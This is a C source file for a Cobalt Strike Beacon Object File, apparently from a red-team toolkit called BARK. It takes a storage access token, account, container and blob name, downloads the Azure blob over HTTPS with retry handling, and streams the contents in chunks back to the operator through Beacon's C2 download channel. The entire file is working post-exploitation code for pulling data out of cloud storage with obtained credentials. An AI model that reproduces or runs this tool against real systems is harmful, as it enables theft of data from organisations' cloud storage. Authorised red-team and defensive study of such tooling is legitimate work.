/* Stream an Azure Blob Storage object through Beacon's C2 download channel. */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"
#include "../../include/storage_blob_utils.h"


static void BarkStorageSafeName(const char *input, char *output,
                                size_t outputSize) {
    size_t i;
    size_t j = 0;

    if (!output || outputSize == 0) return;
    output[0] = '\0';
    if (!input) input = "blob";

    for (i = 0; input[i] && j + 1 < outputSize; i++) {
        char c = input[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_')
            output[j++] = c;
        else
            output[j++] = '_';
    }
    output[j] = '\0';
}

static DWORD BarkStorageRetryAfter(HINTERNET request) {
    WCHAR value[32];
    DWORD valueSize = sizeof(value);
    DWORD i;
    DWORD seconds = 0;

    if (!WINHTTP$WinHttpQueryHeaders(request, WINHTTP_QUERY_RETRY_AFTER,
                                     NULL, value, &valueSize, NULL))
        return 0;
    for (i = 0; i < valueSize / sizeof(WCHAR) && value[i] >= L'0' &&
         value[i] <= L'9'; i++) {
        DWORD digit = (DWORD)(value[i] - L'0');
        if (seconds > (60 - digit) / 10) return 60;
        seconds = seconds * 10 + digit;
    }
    return seconds > 60 ? 60 : seconds;
}

static int BarkStorageStreamBlob(const char *host, const char *path,
                                 LPWSTR headers, const char *downloadName) {
    LPWSTR wideHost = MbsToWcs(host);
    LPWSTR widePath = MbsToWcs(path);
    BYTE *buffer = NULL;
    char partName[320];
    DWORD part = 0;
    int attempt;

    if (!wideHost || !widePath) {
        if (wideHost) HFree(wideHost);
        if (widePath) HFree(widePath);
        return 0;
    }
    buffer = (BYTE *)HAlloc(BARK_DOWNLOAD_CHUNK);
    if (!buffer) {
        HFree(wideHost);
        HFree(widePath);
        return 0;
    }

    for (attempt = 0; attempt < 4; attempt++) {
        HINTERNET session = NULL;
        HINTERNET connect = NULL;
        HINTERNET request = NULL;
        DWORD status = 0;
        DWORD statusSize = sizeof(status);
        int retryable = 0;
        int streamOk = 0;

        BarkGraphThrottleBeforeRequest(wideHost);
        BarkAtomicIncrement(&BarkHttpRequestCount);
        session = WINHTTP$WinHttpOpen(
            L"BARK-BOF/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (session)
            connect = WINHTTP$WinHttpConnect(session, wideHost,
                                             INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (connect)
            request = WINHTTP$WinHttpOpenRequest(
                connect, L"GET", widePath, NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (request)
            WINHTTP$WinHttpAddRequestHeaders(
                request, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        if (!request || !WINHTTP$WinHttpSendRequest(
                request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                NULL, 0, 0, 0) ||
            !WINHTTP$WinHttpReceiveResponse(request, NULL) ||
            !WINHTTP$WinHttpQueryHeaders(request,
                WINHTTP_QUERY_STATUS_CODE_NUM, NULL, &status,
                &statusSize, NULL)) {
            retryable = 1;
        } else if (status == 429 || status >= 500) {
            retryable = 1;
        } else if (status >= 400) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Blob download failed: HTTP %lu\n", status);
        } else {
            for (;;) {
                DWORD available = 0;
                DWORD toRead;
                DWORD read = 0;

                if (!WINHTTP$WinHttpQueryDataAvailable(request, &available))
                    break;
                if (available == 0) {
                    streamOk = 1;
                    break;
                }
                toRead = available > BARK_DOWNLOAD_CHUNK ?
                    BARK_DOWNLOAD_CHUNK : available;
                if (!WINHTTP$WinHttpReadData(request, buffer, toRead, &read) ||
                    read == 0)
                    break;

                MSVCRT$sprintf_s(partName, sizeof(partName),
                    "%s.part%05lu", downloadName, (unsigned long)part);
                if (!BeaconDownload(partName, (const char *)buffer, read)) {
                    BeaconPrintf(CALLBACK_ERROR,
                        "[-] BeaconDownload rejected %s (%lu bytes)\n",
                        partName, (unsigned long)read);
                    break;
                }
                part++;
            }
        }

        if (retryable && attempt < 3) {
            DWORD retryAfter = request ? BarkStorageRetryAfter(request) : 0;
            if (retryAfter == 0) retryAfter = (DWORD)(2 << attempt);
            if (retryAfter > 60) retryAfter = 60;
            if (status == 429) {
                BarkAtomicIncrement(&BarkHttp429Count);
                BarkGraphThrottleAfter429(wideHost, retryAfter);
            }
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] HTTP %lu — retrying blob download in %lu seconds (attempt %d/4)\n",
                status, retryAfter, attempt + 1);
            if (request) WINHTTP$WinHttpCloseHandle(request);
            if (connect) WINHTTP$WinHttpCloseHandle(connect);
            if (session) WINHTTP$WinHttpCloseHandle(session);
            BarkAtomicIncrement(&BarkHttpRetryCount);
            KERNEL32$Sleep(retryAfter * 1000);
            continue;
        }
        if (request) WINHTTP$WinHttpCloseHandle(request);
        if (connect) WINHTTP$WinHttpCloseHandle(connect);
        if (session) WINHTTP$WinHttpCloseHandle(session);
        if (streamOk) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] Queued blob download %s (%lu part(s), 256 KiB chunks)\n",
                downloadName, (unsigned long)part);
        }
        HFree(buffer);
        HFree(wideHost);
        HFree(widePath);
        return streamOk;
    }

    BeaconPrintf(CALLBACK_ERROR,
        "[-] Blob download failed after 4 attempts\n");
    HFree(buffer);
    HFree(wideHost);
    HFree(widePath);
    return 0;
}

void go(char *args, int alen) {
    datap parser;
    char *token;
    char *accountName;
    char *containerName;
    char *blobName;
    char *downloadName;
    char host[96];
    char safeBlob[220];
    char safeDownload[220];
    char finalName[280];
    char *path;
    LPWSTR headers;

    BeaconDataParse(&parser, args, alen);
    token = BeaconDataExtract(&parser, NULL);
    accountName = BeaconDataExtract(&parser, NULL);
    containerName = BeaconDataExtract(&parser, NULL);
    blobName = BeaconDataExtract(&parser, NULL);
    downloadName = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0 ||
        !BarkStorageIsAccountName(accountName) ||
        !BarkStorageIsContainerName(containerName) ||
        !blobName || MSVCRT$strlen(blobName) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_download_storage_blob <storageToken> <accountName> <containerName> <blobName> [downloadName]\n");
        return;
    }

    MSVCRT$sprintf_s(host, sizeof(host), "%s.blob.core.windows.net", accountName);
    path = BarkStorageBuildBlobPath(containerName, blobName);
    if (!path) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build blob request path\n");
        return;
    }
    headers = BarkMakeAuthHeader(token,
        "x-ms-version: " BARK_STORAGE_API_VERSION "\r\n");
    if (!headers) {
        HFree(path);
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build storage auth header\n");
        return;
    }

    BarkStorageSafeName(blobName, safeBlob, sizeof(safeBlob));
    if (downloadName && MSVCRT$strlen(downloadName) > 0) {
        BarkStorageSafeName(downloadName, safeDownload, sizeof(safeDownload));
        MSVCRT$sprintf_s(finalName, sizeof(finalName), "%s", safeDownload);
    } else {
        BarkStorageSafeName(accountName, safeDownload, sizeof(safeDownload));
        MSVCRT$sprintf_s(finalName, sizeof(finalName),
            "bark_blob_%s_%s", safeDownload, safeBlob);
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Downloading blob %s/%s/%s as %s.partNNNNN\n",
        accountName, containerName, blobName, finalName);
    BarkStorageStreamBlob(host, path, headers, finalName);

    HFree(headers);
    HFree(path);
}
